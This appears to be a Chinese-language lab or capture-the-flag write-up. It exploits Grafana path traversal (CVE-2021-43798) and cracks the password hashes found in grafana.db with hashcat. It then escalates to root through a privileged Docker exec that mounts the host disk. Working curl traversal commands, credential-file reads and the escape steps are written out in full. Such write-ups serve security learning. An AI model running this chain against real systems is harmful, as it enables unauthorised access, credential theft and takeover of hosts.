Phase 1

立足点：Grafana 路径穿越 → 密码破解

🧒 儿童版 — 插件目录往上爬 Grafana 的插件目录 /public/plugins/插件名/ 是公开的。加上 ..%2F（URL 编码的 ../）就能往上级目录爬，读到系统上的任何文件。就像餐厅允许你去取餐区拿食物，但你沿着走廊一直走到了后厨甚至保险箱。

CVE-2021-43798 路径穿越

# 确认漏洞
$ curl 'http://10.129.27.126:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'

# 发现是 Docker 容器
$ curl '...%2Fetc%2Fhostname'
e6ff5b1cbc85

# 下载 Grafana 数据库
$ curl 'http://10.129.27.126:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db

提取用户哈希 & 破解

$ sqlite3 grafana.db
sqlite> select login, password, salt from user;
admin | 7a919e4bbe95cf5104edf354ee2e6234efac... | YObSoLj55S
boris | dc6becccbb57d34daf4a4e391d2015d3350c... | LCBhdtJWjl
Grafana 哈希格式 PBKDF2-SHA256，10000 轮。数据库中是 hex + 明文 salt，需要转换为 sha256:iterations:base64(salt):base64(hash) 格式给 hashcat（-m 10900）。 
$ python3 convert.py > hash.txt
$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
beautiful1

Phase 2

权限提升：Docker 逃逸（挂载宿主机磁盘）

boris@data:~$ sudo -l
(root) NOPASSWD: /snap/bin/docker exec *
🧒 儿童版 — 小房间开门通主控室 boris 被允许用管理员权限进入 Docker 容器。容器本来是隔离的"小房间"，但我们用 --privileged 参数进去后，可以把宿主机的整个硬盘挂载到容器里——就像在小房间的墙上开了一扇门，直接通到了大楼的主控室。 
# 以 root + 特权模式进入容器
$ sudo /snap/bin/docker exec -u root --privileged -it e6ff5b1cbc85 bash

# 挂载宿主机磁盘
# mount /dev/sda1 /mnt

# 读取 root flag
# cat /mnt/root/root.txt
ecac10514c5b7ffdcd1e5d55bb6669c3

知识点总结

Grafana CVE-2021-43798。

/public/plugins/<插件名>/..%2F..%2F 无需认证即可读取任意文件。首选目标：/var/lib/grafana/grafana.db（用户密码）和 /etc/grafana/grafana.ini（配置）。

Grafana 哈希需要格式转换。

PBKDF2-SHA256，数据库中是 hex + 明文 salt。转换为 sha256:10000:base64(salt):base64(hash) 后用 hashcat -m 10900。

Docker --privileged = 逃逸。

--privileged 让容器拥有宿主机全部设备访问权限。mount /dev/sda1 /mnt 后就能读写宿主机文件系统。

Grafana 路径穿越→PBKDF2 破解 → SSH→Docker --privileged → mount → root
